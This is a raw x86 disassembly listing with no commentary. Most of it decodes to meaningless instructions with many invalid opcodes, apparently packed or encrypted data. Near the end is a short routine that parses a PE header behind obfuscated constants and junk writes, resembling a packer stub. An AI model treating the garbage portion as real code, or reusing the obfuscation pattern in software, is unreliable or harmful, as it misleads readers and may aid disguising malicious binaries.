  4236ee:	adc    cl,BYTE PTR [ebx+0xb3f6240]
  4236f4:	adc    al,BYTE PTR [ebp+edx*4+0x5e]
  4236f8:	shr    BYTE PTR [eax-0xb7f60e],1
  4236fe:	inc    ecx
  4236ff:	cmc    
  423700:	pop    edi
  423701:	xchg   esi,eax
  423702:	jle    0x4236cc
  423704:	lods   al,BYTE PTR ds:[esi]
  423705:	jmp    0x4236f9
  423707:	sub    al,0xd7
  423709:	inc    edx
  42370a:	rcl    DWORD PTR [ecx-0x70d2b014],1
  423710:	push   esi
  423711:	xor    ah,cl
  423713:	pop    eax
  423714:	test   BYTE PTR [ebx-0x28a06171],cl
  42371a:	pop    ds
  42371b:	les    esp,FWORD PTR [edi]
  42371d:	adc    DWORD PTR [ecx-0x7333a686],eax
  423723:	or     eax,eax
  423725:	add    eax,0xc249e481
  42372a:	fwait
  42372b:	not    ecx
  42372d:	(bad)  
  42372e:	sbb    ah,BYTE PTR [ecx+edx*1]
  423731:	jae    0x42372d
  423733:	or     DWORD PTR [edx+ebp*8-0x75],0xffffff81
  423738:	repz adc esp,DWORD PTR [edi+0x42]
  42373c:	mov    ecx,0xe061a928
  423741:	sub    edi,edi
  423743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423744:	sar    BYTE PTR [eax-0x70],0xb2
  423748:	sub    eax,0x1ce259f5
  42374d:	sub    eax,0x47cca47e
  423752:	jecxz  0x423755
  423754:	fwait
  423755:	push   esi
  423756:	outs   dx,BYTE PTR ds:[esi]
  423757:	pusha  
  423758:	adc    ebp,edx
  42375a:	dec    eax
  42375b:	mov    dh,0x1b
  42375d:	add    cl,BYTE PTR [ebp+0x7]
  423760:	push   es
  423761:	sbb    BYTE PTR [esi+esi*8-0x51de9404],al
  423768:	daa    
  423769:	sbb    BYTE PTR [ecx+0x69532db6],dl
  42376f:	and    BYTE PTR [ebx+0x49],0xb1
  423773:	add    bh,BYTE PTR [ebx-0x3c]
  423776:	jg     0x423794
  423778:	sub    edi,DWORD PTR [ecx+0x31101197]
  42377e:	aaa    
  42377f:	pop    edi
  423780:	adc    DWORD PTR [ecx-0x37],eax
  423783:	out    dx,al
  423784:	aaa    
  423785:	mov    al,ds:0x6741b849
  42378a:	fcomp  QWORD PTR [edi]
  42378c:	mov    bh,0x7
  42378e:	push   esp
  42378f:	sti    
  423790:	mov    al,ds:0x8797300c
  423795:	push   ds
  423796:	(bad)  
  423797:	cmp    DWORD PTR [edi-0x7d],ebp
  42379a:	call   0x82569a5d
  42379f:	test   BYTE PTR [ebx],al
  4237a1:	mov    ds:0xbb2a6614,eax
  4237a6:	push   ss
  4237a7:	das    
  4237a8:	push   esp
  4237a9:	xor    bl,BYTE PTR [eax+0x5f4331f9]
  4237af:	push   edx
  4237b1:	jbe    0x4237fa
  4237b3:	cld    
  4237b4:	and    DWORD PTR [ebx-0x16],eax
  4237b7:	scas   eax,DWORD PTR es:[edi]
  4237b8:	mov    eax,es
  4237ba:	mov    eax,0x2bbc4d7e
  4237bf:	dec    ebx
  4237c0:	sbb    BYTE PTR ds:0x56dda8f5,0x50
  4237c7:	or     bl,BYTE PTR [esi-0x7699d626]
  4237cd:	iret   
  4237ce:	and    ebx,DWORD PTR [edx-0x30f2a04e]
  4237d4:	stos   BYTE PTR es:[edi],al
  4237d5:	ja     0x4237cc
  4237d7:	cwde   
  4237d8:	fst    DWORD PTR [ecx+eax*4]
  4237db:	xchg   ecx,eax
  4237dc:	test   DWORD PTR [esi],0x3d144ee6
  4237e2:	sbb    DWORD PTR [esi+0x5e12ae87],edx
  4237e8:	mov    dh,0xa5
  4237ea:	ins    DWORD PTR es:[edi],dx
  4237eb:	rcr    BYTE PTR [esi-0x37],1
  4237ee:	fcomp  DWORD PTR [edx-0x4c]
  4237f1:	lods   al,BYTE PTR ds:[esi]
  4237f2:	mov    ah,0x7c
  4237f4:	push   ebp
  4237f5:	adc    bh,BYTE PTR [esi+0x57468aac]
  4237fb:	push   eax
  4237fc:	and    dl,BYTE PTR [ebx]
  4237fe:	or     dh,BYTE PTR [ebp-0x34d08b82]
  423804:	test   BYTE PTR [edi+0x4732a399],bl
  42380a:	xchg   esp,eax
  42380b:	sbb    BYTE PTR [ecx+0x36],bh
  42380e:	fidiv  WORD PTR ds:0x15edb4e0
  423814:	dec    esi
  423815:	loope  0x4237fd
  423817:	(bad)  
  423818:	and    esi,ebp
  42381a:	sahf   
  42381b:	gs xchg ecx,eax
  42381d:	stos   BYTE PTR es:[edi],al
  42381e:	mov    edi,DWORD PTR [ebx+0x100f63cf]
  423824:	pop    es
  423825:	mov    bh,0x71
  423827:	xor    BYTE PTR [ecx],0xf6
  42382a:	pusha  
  42382b:	add    al,0x5c
  42382d:	gs popf 
  42382f:	stos   DWORD PTR es:[edi],eax
  423830:	mov    esp,0x30260a90
  423835:	sti    
  423836:	pop    ss
  423837:	and    al,dh
  423839:	(bad)  
  42383a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42383b:	imul   ebx,esp,0x5d
  42383e:	xor    eax,0x303fbd7b
  423843:	lahf   
  423844:	push   ecx
  423845:	in     al,dx
  423846:	jno    0x423862
  423848:	mov    ds:0x5df4c462,al
  42384d:	mov    ebx,0xdcc7311c
  423852:	push   0x65031781
  423857:	dec    edi
  423858:	popa   
  423859:	and    edi,DWORD PTR [ebp-0x751f54f7]
  42385f:	or     BYTE PTR [edi],cl
  423861:	jg     0x423853
  423863:	cmp    al,0x6d
  423865:	sub    BYTE PTR gs:0xb35a1a64,bl
  42386c:	xchg   edx,eax
  42386d:	mov    edi,0xce126477
  423872:	push   ebx
  423873:	sar    esi,0xbc
  423876:	lds    edx,FWORD PTR [eax+eiz*2]
  423879:	lds    ebp,FWORD PTR [ebx+0x40318981]
  42387f:	jno    0x42389d
  423881:	mov    ch,0x5a
  423883:	iret   
  423884:	pusha  
  423885:	lds    edx,FWORD PTR [eax+0x29]
  423888:	in     eax,0xc3
  42388a:	mov    ah,ah
  42388c:	jo     0x4238f9
  42388e:	loopne 0x4238fa
  423890:	sub    eax,0x67ad30b5
  423895:	outs   dx,DWORD PTR ds:[esi]
  423896:	out    dx,eax
  423897:	jl     0x423840
  423899:	push   0xcad8a607
  42389e:	cmp    al,0x32
  4238a0:	add    BYTE PTR [esi+0x2c39799d],al
  4238a6:	aad    0x6f
  4238a8:	dec    ebp
  4238a9:	hlt    
  4238aa:	dec    edi
  4238ab:	fistp  WORD PTR [ecx]
  4238ad:	popa   
  4238ae:	sbb    BYTE PTR [edx+edi*1],cl
  4238b1:	mov    BYTE PTR [esi-0x73b0a2a2],0x14
  4238b8:	(bad)  
  4238b9:	mov    al,ds:0x7a36db9e
  4238be:	mov    WORD PTR [edx-0x46695123],gs
  4238c4:	daa    
  4238c5:	jb     0x423932
  4238c7:	mov    edi,0x8ead8efd
  4238cc:	call   0x2f354e0c
  4238d1:	mov    al,0xb7
  4238d3:	loope  0x423888
  4238d5:	(bad)  
  4238d6:	jns    0x42390d
  4238d8:	sti    
  4238d9:	cmc    
  4238da:	popf   
  4238db:	inc    esp
  4238dc:	mov    ebx,0x630164ec
  4238e1:	call   0xa248:0xd4a44832
  4238e8:	xlat   BYTE PTR ds:[ebx]
  4238e9:	add    BYTE PTR [eax+0x4b01bd25],cl
  4238ef:	daa    
  4238f0:	dec    ecx
  4238f1:	mov    dl,0x89
  4238f3:	xor    eax,0x6943cb5b
  4238f8:	and    edi,edx
  4238fa:	dec    esp
  4238fb:	inc    edi
  4238fc:	pop    esi
  4238fd:	mov    eax,ds:0x2f3fd154
  423902:	enter  0xdc7c,0x7d
  423906:	in     al,0x5f
  423908:	mov    esi,DWORD PTR [ecx+0x1f]
  42390b:	sub    eax,DWORD PTR [ebp-0x278b6151]
  423911:	add    BYTE PTR [esi],0xc5
  423914:	sbb    al,0x6b
  423916:	or     dh,al
  423918:	imul   ebx,esi,0xffffffdf
  42391b:	add    BYTE PTR [ebx+0x1c0cffb8],bh
  423921:	add    al,0x37
  423923:	lahf   
  423924:	es pop eax
  423926:	into   
  423927:	popf   
  423928:	or     al,0x79
  42392a:	mov    al,0xd5
  42392c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42392d:	mov    DWORD PTR [esi],0xac1960ee
  423933:	call   0x6454:0xa8487910
  42393a:	cwde   
  42393b:	nop
  42393c:	rcr    BYTE PTR [ebx-0xf],cl
  42393f:	pushf  
  423940:	int3   
  423941:	jo     0x423923
  423943:	std    
  423944:	lds    ebx,FWORD PTR [edi]
  423946:	pop    ss
  423947:	jecxz  0x423953
  423949:	loop   0x423918
  42394b:	aas    
  42394c:	mov    ebx,0xc031df16
  423951:	es out dx,eax
  423953:	xchg   ah,bl
  423955:	push   edx
  423956:	adc    eax,0x79224cdf
  42395b:	dec    esi
  42395c:	scas   al,BYTE PTR es:[edi]
  42395d:	test   al,0xb3
  42395f:	push   eax
  423960:	jge    0x423940
  423962:	loope  0x423984
  423964:	je     0x4239ce
  423966:	int    0xe7
  423968:	repz sbb eax,0x57f65d33
  42396e:	mov    al,ah
  423970:	jne    0x4239eb
  423972:	aaa    
  423973:	cmp    al,0x84
  423975:	pop    edx
  423976:	pop    ss
  423977:	addr16 daa 
  423979:	sahf   
  42397a:	inc    edx
  42397b:	out    0x56,al
  42397d:	inc    ebx
  42397e:	xchg   ebp,eax
  42397f:	lods   eax,DWORD PTR ds:[esi]
  423980:	and    BYTE PTR [eax+0x2442fe58],dh
  423986:	ss dec esp
  423988:	sub    ebp,DWORD PTR [esi+0x3c10c592]
  42398e:	into   
  42398f:	jp     0x4239d8
  423991:	mov    bh,0xd1
  423993:	sub    edx,DWORD PTR [eax+0x15]
  423996:	sbb    edi,edx
  423998:	ins    DWORD PTR es:[edi],dx
  423999:	and    BYTE PTR [edx+0x7c],bl
  42399c:	dec    esp
  42399d:	jmp    0xa913fa67
  4239a2:	loopne 0x423955
  4239a4:	xchg   esp,eax
  4239a5:	loop   0x42394c
  4239a7:	aam    0x53
  4239a9:	sub    BYTE PTR [ebp-0x72],cl
  4239ac:	into   
  4239ad:	pop    es
  4239ae:	pop    eax
  4239af:	add    eax,0x512963d4
  4239b4:	and    al,0x83
  4239b6:	and    DWORD PTR [ebp-0x16],eax
  4239b9:	sub    DWORD PTR ds:0xccb1f40f,0x35
  4239c0:	sub    DWORD PTR [edi+0x54dcc160],edx
  4239c6:	xchg   edi,eax
  4239c7:	jl     0x423a40
  4239c9:	add    ebx,DWORD PTR [ecx-0x1]
  4239cc:	ret    
  4239cd:	es xchg ecx,eax
  4239cf:	cli    
  4239d0:	aam    0x9
  4239d2:	cld    
  4239d3:	daa    
  4239d4:	fist   WORD PTR [ecx-0x50b93139]
  4239da:	mov    eax,ds:0x7a7223ec
  4239df:	lock jnp 0x4239fb
  4239e2:	rcl    BYTE PTR [esi],1
  4239e4:	and    edx,DWORD PTR ds:0x1d2c4f4c
  4239ea:	sbb    bl,BYTE PTR [esi+0x6ca7d0a6]
  4239f0:	imul   edx,DWORD PTR [ebp+0xc],0xc2b62710
  4239f7:	mov    ecx,0x265c27b2
  4239fc:	mov    dh,0x6d
  4239fe:	dec    ebp
  4239ff:	dec    ebp
  423a00:	mov    ds:0xc9709a3b,al
  423a05:	repz test BYTE PTR [ebx-0x2aa9abe5],0xa5
  423a0d:	push   ebp
  423a0e:	jnp    0x4239d0
  423a10:	out    dx,eax
  423a11:	push   ecx
  423a12:	ins    DWORD PTR es:[edi],dx
  423a13:	dec    esp
  423a14:	clc    
  423a15:	xchg   esi,eax
  423a16:	(bad)  
  423a17:	mov    bh,0x15
  423a19:	and    ebp,ebx
  423a1b:	pop    es
  423a1c:	sti    
  423a1d:	mov    ecx,0x6569f2fe
  423a22:	sti    
  423a23:	mov    edi,0xbe01cb27
  423a28:	cwde   
  423a29:	(bad)  
  423a2a:	cli    
  423a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a2c:	popf   
  423a2d:	xor    eax,0xbd96c923
  423a32:	fucom  st(5)
  423a34:	xor    BYTE PTR [edi],dh
  423a36:	lock lock cmp DWORD PTR [eax],ebp
  423a3a:	adc    al,0xdf
  423a3c:	inc    esp
  423a3d:	mov    eax,0x78500176
  423a42:	mov    ah,0x9c
  423a44:	add    cl,BYTE PTR ds:0x88cce85b
  423a4a:	adc    BYTE PTR [eax-0x1b4e99e9],ch
  423a50:	inc    esp
  423a51:	push   edx
  423a52:	sub    eax,0x28576a5e
  423a57:	sahf   
  423a58:	xchg   ebp,ebx
  423a5a:	or     eax,0x2a9ad086
  423a5f:	jg     0x423ada
  423a61:	pop    eax
  423a62:	ror    BYTE PTR [edx+0x178007a3],cl
  423a68:	test   eax,0x15302c8
  423a6d:	ins    DWORD PTR es:[edi],dx
  423a6e:	or     eax,0xa4ccb7e2
  423a73:	addr16 popa 
  423a75:	xchg   BYTE PTR [esi+0x30e7b5d2],dh
  423a7b:	mov    ah,0x40
  423a7d:	jmp    0x423a36
  423a7f:	out    0x28,eax
  423a81:	xor    ah,BYTE PTR [esi-0x2b]
  423a84:	push   ecx
  423a85:	idiv   DWORD PTR [ebp-0x2d]
  423a88:	or     ah,BYTE PTR [eax+eiz*1-0x9]
  423a8c:	pop    es
  423a8d:	gs or  dl,ah
  423a90:	inc    ebp
  423a91:	test   ecx,edi
  423a93:	adc    BYTE PTR [ebx+0x45517e4b],ch
  423a99:	sbb    DWORD PTR [eax-0x21ce34ea],0x41
  423aa0:	xchg   ecx,eax
  423aa1:	and    DWORD PTR [edx+0x5becd0ba],0xffffffef
  423aa8:	lahf   
  423aa9:	nop
  423aaa:	stc    
  423aab:	add    esi,DWORD PTR [ecx]
  423aad:	inc    eax
  423aae:	(bad)  
  423aaf:	or     dl,BYTE PTR [edi]
  423ab1:	lods   eax,DWORD PTR ds:[esi]
  423ab2:	pop    ebx
  423ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ab4:	(bad)
  423ab7:	shl    edi,0xd1
  423aba:	ds pop ebp
  423abc:	loope  0x423b1d
  423abe:	mov    ds:0x8ba9d94c,eax
  423ac3:	cmp    DWORD PTR [ecx],0xd0e30aaf
  423ac9:	fild   WORD PTR [edi-0x294c99d1]
  423acf:	stos   BYTE PTR es:[edi],al
  423ad0:	cmp    bh,BYTE PTR [eax-0xd]
  423ad3:	nop
  423ad4:	inc    ecx
  423ad5:	push   cs
  423ad6:	dec    ebx
  423ad7:	mov    al,0xd3
  423ad9:	push   ss
  423ada:	jecxz  0x423a70
  423adc:	mov    bh,0xa5
  423ade:	add    eax,0x32f9d163
  423ae3:	inc    ecx
  423ae4:	std    
  423ae5:	and    DWORD PTR [edi],esp
  423ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ae8:	push   edi
  423ae9:	loop   0x423b4d
  423aeb:	jno    0x423a7b
  423aed:	ins    DWORD PTR es:[edi],dx
  423aee:	inc    esi
  423aef:	pop    ss
  423af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423af1:	es addr16 inc edx
  423af4:	sbb    DWORD PTR [ecx],edx
  423af6:	jb     0x423a87
  423af8:	jae    0x423b79
  423afa:	(bad)  
  423afb:	loop   0x423a8f
  423afd:	adc    bl,bl
  423aff:	ins    DWORD PTR es:[edi],dx
  423b00:	loopne 0x423b25
  423b02:	rol    DWORD PTR [edi+0x4dedc46d],1
  423b08:	mov    DWORD PTR [ebp+0x70f6c586],esi
  423b0e:	adc    eax,DWORD PTR [edi]
  423b10:	sub    esp,ebp
  423b12:	fs mov dl,0x7a
  423b15:	cmp    eax,0x72aa12c7
  423b1a:	scas   eax,DWORD PTR es:[edi]
  423b1b:	or     eax,0x56f07bc4
  423b20:	sbb    DWORD PTR cs:[ebx+0x31],edx
  423b24:	les    edi,FWORD PTR [ebx+0x14]
  423b27:	push   0x71
  423b29:	call   0x17ab:0x45a6f97e
  423b30:	lock dec ebx
  423b32:	sub    eax,0x5c2f76ec
  423b37:	pop    edx
  423b38:	push   0xffffffce
  423b3a:	push   ss
  423b3b:	div    DWORD PTR [eax-0x2728d215]
  423b41:	ins    DWORD PTR es:[edi],dx
  423b42:	(bad)  
  423b44:	fisubr DWORD PTR [eax+0x2]
  423b47:	loope  0x423ae4
  423b49:	cmp    ah,dh
  423b4b:	inc    ebx
  423b4c:	or     BYTE PTR [ecx+0x6527c60c],bl
  423b52:	scas   eax,DWORD PTR es:[edi]
  423b53:	dec    eax
  423b54:	pop    es
  423b55:	iret   
  423b56:	push   ecx
  423b57:	jle    0x423b81
  423b59:	mov    DWORD PTR [ebx],edx
  423b5b:	fldenv [edx-0x46f97eac]
  423b61:	mov    esp,0x45cb88a4
  423b66:	mov    ds:0xfdb8bd0e,al
  423b6b:	inc    edi
  423b6c:	adc    eax,0x187a6642
  423b71:	loop   0x423b73
  423b73:	hlt    
  423b74:	sub    ebx,ebx
  423b76:	jge    0x423bd2
  423b78:	pop    es
  423b79:	mov    dh,bl
  423b7b:	push   cs
  423b7c:	clc    
  423b7d:	adc    dl,BYTE PTR [ebp-0x12ba532f]
  423b83:	jle    0x423ba0
  423b85:	dec    eax
  423b86:	in     al,dx
  423b87:	jmp    FWORD PTR [edi+0x3803997e]
  423b8d:	pushf  
  423b8e:	sub    cl,bl
  423b90:	add    al,0x39
  423b92:	pop    edx
  423b93:	or     BYTE PTR [esp+ebx*1-0x6dcb6b00],dl
  423b9a:	clc    
  423b9b:	push   eax
  423b9c:	jns    0x423b4f
  423b9e:	cmp    BYTE PTR [ecx+0x77],dh
  423ba1:	sub    eax,0x60d7d20
  423ba6:	sub    DWORD PTR ds:0x39bc9874,ebx
  423bac:	icebp  
  423bad:	mov    ebx,0x2e69cee2
  423bb2:	test   al,0x6e
  423bb4:	push   0x424d041
  423bb9:	int3   
  423bba:	add    al,0x19
  423bbc:	mov    al,0x62
  423bbe:	leave  
  423bbf:	ror    DWORD PTR [esi+0x68d44da8],0xa2
  423bc6:	inc    ebp
  423bc7:	push   ebp
  423bc8:	pop    ss
  423bc9:	pop    ebx
  423bca:	sahf   
  423bcb:	(bad)  
  423bcc:	fmul   DWORD PTR [esi]
  423bce:	(bad)  
  423bcf:	out    0xe0,eax
  423bd1:	outs   dx,DWORD PTR ds:[esi]
  423bd2:	inc    esi
  423bd3:	jae    0x423c51
  423bd5:	icebp  
  423bd6:	pop    eax
  423bd7:	out    0xbf,eax
  423bd9:	xor    DWORD PTR [edi+eiz*2+0x6],0x9973c50
  423be1:	lea    esi,[ebx+eiz*1]
  423be4:	jecxz  0x423c09
  423be6:	ja     0x423bfc
  423be8:	pop    ebx
  423be9:	adc    bl,BYTE PTR [eax]
  423beb:	mov    ds:0x59121bcd,eax
  423bf0:	fdecstp 
  423bf2:	cmp    eax,0x80e9ede
  423bf7:	out    dx,al
  423bf8:	dec    ebp
  423bf9:	jg     0x423c22
  423bfb:	cwde   
  423bfc:	outs   dx,DWORD PTR ds:[esi]
  423bfd:	ins    DWORD PTR es:[edi],dx
  423bfe:	push   ebp
  423bff:	xchg   esi,eax
  423c00:	mov    WORD PTR [ecx-0x4f],ds
  423c03:	jp     0x423bc5
  423c05:	retf   
  423c06:	les    esp,FWORD PTR [esi+eiz*1]
  423c09:	into   
  423c0a:	mov    al,0xb9
  423c0c:	into   
  423c0d:	mov    dl,0x80
  423c0f:	aas    
  423c10:	ret    0xfb68
  423c13:	(bad)  
  423c14:	mov    eax,0xe59ccfd
  423c19:	and    al,0x93
  423c1b:	xor    esi,ebp
  423c1d:	dec    eax
  423c1e:	lods   al,BYTE PTR ds:[esi]
  423c1f:	cmp    BYTE PTR [esi-0x22],dl
  423c22:	arpl   WORD PTR [ecx],di
  423c24:	int3   
  423c25:	ror    edx,cl
  423c27:	lahf   
  423c28:	ins    BYTE PTR es:[edi],dx
  423c29:	push   0x34
  423c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c2c:	or     eax,0x3974ce18
  423c31:	out    0xfe,al
  423c33:	sbb    DWORD PTR [eax+0x2279dc50],ebx
  423c39:	in     al,dx
  423c3a:	fisubr WORD PTR [esp]
  423c3d:	das    
  423c3e:	xlat   BYTE PTR ds:[ebx]
  423c3f:	lock in al,dx
  423c41:	inc    edi
  423c42:	ret    
  423c43:	int    0xc8
  423c45:	or     DWORD PTR [ebx+eax*2],0x55
  423c49:	jb     0x423cb6
  423c4b:	sub    DWORD PTR [eax-0x42e51933],0x4ff7d7e3
  423c55:	daa    
  423c56:	sar    BYTE PTR [eax-0x11dc4a30],cl
  423c5c:	nop
  423c5d:	mov    ds:0x2e3cfde1,al
  423c62:	in     al,dx
  423c63:	in     eax,dx
  423c64:	adc    DWORD PTR [eax],ebp
  423c66:	and    BYTE PTR [eiz*8+0x1ce7171e],al
  423c6d:	adc    al,0xb9
  423c6f:	xor    al,0x91
  423c71:	push   ebx
  423c72:	inc    ebx
  423c73:	pop    ss
  423c74:	sahf   
  423c75:	mul    BYTE PTR [ebp-0x2f]
  423c78:	cli    
  423c79:	inc    ebx
  423c7a:	fisub  DWORD PTR [edx]
  423c7c:	shr    DWORD PTR [ebx-0x39d5aa56],0xaa
  423c83:	les    ebp,FWORD PTR [edi+0x5d0bc6b4]
  423c89:	jg     0x423c86
  423c8b:	imul   DWORD PTR [edi]
  423c8d:	int    0x4c
  423c8f:	pop    ebx
  423c90:	ror    DWORD PTR [ebx+eiz*1+0x18beb42c],1
  423c97:	loop   0x423c6e
  423c99:	sub    DWORD PTR [eax],0xfffffff3
  423c9c:	(bad)  
  423c9d:	pop    eax
  423c9e:	mov    ecx,0x13b264fb
  423ca3:	inc    esi
  423ca4:	dec    ebx
  423ca5:	adc    BYTE PTR [ecx+0x5588dc50],dh
  423cab:	xchg   DWORD PTR [edi+0x32a5f209],esi
  423cb1:	pop    ebp
  423cb2:	push   esp
  423cb3:	push   edi
  423cb4:	loop   0x423c43
  423cb6:	and    dh,cl
  423cb8:	mov    dl,0x9
  423cba:	das    
  423cbb:	xchg   ebp,eax
  423cbc:	dec    ebx
  423cbd:	cmc    
  423cbe:	fisub  DWORD PTR [edx*1+0x739e6f8c]
  423cc5:	push   es
  423cc6:	mov    ah,0x1e
  423cc8:	mov    edi,0xe3e85a89
  423ccd:	shl    BYTE PTR [edx],cl
  423ccf:	push   esi
  423cd0:	jns    0x423cc1
  423cd2:	into   
  423cd3:	and    ch,cl
  423cd5:	dec    ecx
  423cd6:	sub    esi,ecx
  423cd8:	fs test eax,edi
  423cdb:	rol    BYTE PTR [ebx-0x76ac3408],cl
  423ce1:	pop    ebx
  423ce2:	ins    DWORD PTR es:[edi],dx
  423ce3:	inc    esp
  423ce4:	add    edx,DWORD PTR [edx-0x57]
  423ce7:	pop    edx
  423ce8:	jo     0x423d5c
  423cea:	loop   0x423c99
  423cec:	push   edx
  423ced:	outs   dx,BYTE PTR ds:[esi]
  423cee:	int    0x91
  423cf0:	jbe    0x423d07
  423cf2:	scas   eax,DWORD PTR es:[edi]
  423cf3:	mov    BYTE PTR [esi+eiz*2-0x23ca11a5],al
  423cfa:	lods   al,BYTE PTR ds:[esi]
  423cfb:	inc    ebx
  423cfc:	frstorw [edi-0x6e947f35]
  423d03:	push   es
  423d04:	add    dl,BYTE PTR [ecx-0x4cbd5308]
  423d0a:	push   ebp
  423d0b:	das    
  423d0c:	lahf   
  423d0d:	leave  
  423d0e:	loop   0x423cbe
  423d10:	mov    al,ds:0x14a2f805
  423d15:	mov    ebx,0x96e622bf
  423d1a:	mov    eax,0x1f17a9e9
  423d1f:	sub    eax,0xb5214ddc
  423d24:	icebp  
  423d25:	das    
  423d26:	jbe    0x423d96
  423d28:	jbe    0x423d53
  423d2a:	dec    eax
  423d2b:	dec    edi
  423d2c:	pop    ebp
  423d2d:	or     BYTE PTR [ebp-0x1e],dh
  423d30:	and    al,0x7
  423d32:	cld    
  423d33:	outs   dx,DWORD PTR ds:[esi]
  423d34:	mov    edi,0x5fee18e7
  423d39:	cmp    al,0xe9
  423d3b:	and    ebx,DWORD PTR [edi+0x27]
  423d3e:	pop    eax
  423d3f:	or     bl,dh
  423d41:	inc    edx
  423d42:	mov    dh,0x60
  423d44:	(bad)  
  423d45:	mov    esi,0x5dff940
  423d4a:	adc    BYTE PTR [edx-0x162aa22b],al
  423d50:	or     ah,BYTE PTR [ecx+0x2d3d432b]
  423d56:	mov    eax,ds:0x3ad00085
  423d5b:	sub    al,dh
  423d5d:	sbb    BYTE PTR [eax],bh
  423d5f:	in     al,0x1f
  423d61:	mov    ds:0xcff8bdb2,eax
  423d66:	adc    al,0x89
  423d68:	cld    
  423d69:	lea    ebp,[edi]
  423d6b:	mov    esp,0xf9df087
  423d70:	xchg   BYTE PTR [eax],al
  423d72:	fwait
  423d73:	les    ebx,FWORD PTR [eax+edi*8-0x158f19c5]
  423d7a:	cmp    BYTE PTR [eax+ebp*1+0x511c754d],bh
  423d81:	dec    ebx
  423d82:	mov    ds:0x69b84c81,eax
  423d87:	push   cs
  423d88:	js     0x423d92
  423d8a:	call   0x640d:0xb398a30c
  423d91:	les    eax,FWORD PTR [ebx]
  423d93:	sub    al,0x3b
  423d95:	neg    DWORD PTR [ecx]
  423d97:	sbb    eax,0xe4b7570c
  423d9c:	xacquire xchg DWORD PTR [ecx],eax
  423d9f:	sub    eax,0x86fe1238
  423da4:	dec    ecx
  423da5:	(bad)  
  423da6:	sub    BYTE PTR [ecx+0x34],cl
  423da9:	jno    0x423dc5
  423dab:	cmp    al,0x51
  423dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dae:	xchg   DWORD PTR [eax+ebp*2+0x7f],ebx
  423db2:	sbb    eax,0xd54aae49
  423db7:	inc    ebx
  423db8:	test   DWORD PTR [ecx-0x44f8225],ebx
  423dbe:	xchg   BYTE PTR [esi-0x3c29f182],cl
  423dc4:	and    edx,ebp
  423dc6:	ror    DWORD PTR [edx-0x11],cl
  423dc9:	out    0xe7,al
  423dcb:	adc    al,0xc5
  423dcd:	(bad)  
  423dce:	push   ebx
  423dcf:	pop    ebx
  423dd0:	out    dx,eax
  423dd1:	data16 jp 0x423d66
  423dd4:	xor    al,0x9b
  423dd6:	lock (bad) 
  423dd8:	add    ecx,DWORD PTR [edx]
  423dda:	pop    es
  423ddb:	stos   BYTE PTR es:[edi],al
  423ddc:	sub    dh,ah
  423dde:	cmp    al,0x41
  423de0:	outs   dx,DWORD PTR ds:[esi]
  423de1:	stos   DWORD PTR es:[edi],eax
  423de2:	repz dec esp
  423de4:	cmp    edi,DWORD PTR [esi+0x6486e9b8]
  423dea:	jae    0x423d6f
  423dec:	(bad)  
  423ded:	or     DWORD PTR [ecx-0x734dcccf],ecx
  423df3:	adc    DWORD PTR [eax+0x6c],esp
  423df6:	cs out 0x65,eax
  423df9:	out    dx,eax
  423dfa:	sbb    al,0x59
  423dfc:	lea    ecx,[ebx-0x2a6e6de7]
  423e02:	mov    eax,DWORD PTR [ebp+0x8]
  423e05:	movsx  eax,BYTE PTR [eax]
  423e08:	mov    edx,0x3272f6
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42a9eb
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
